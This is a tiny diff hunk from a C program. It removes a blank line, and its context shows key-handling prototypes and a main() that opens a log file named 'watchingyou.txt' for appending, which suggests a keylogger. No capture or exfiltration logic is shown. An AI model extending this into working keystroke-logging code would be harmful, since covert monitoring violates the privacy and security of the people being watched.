@@ -16,7 +16,6 @@ boolean isSpecialKey(int k, FILE * fPtr); //function prototype
 boolean isShiftSymbol(FILE * fPtr);
 
 int main(void) {
-
 	//create file to write to
 	FILE *fPtr;
 	fPtr = fopen("watchingyou.txt", "a+"); //append to the file; if doesn't exist, create
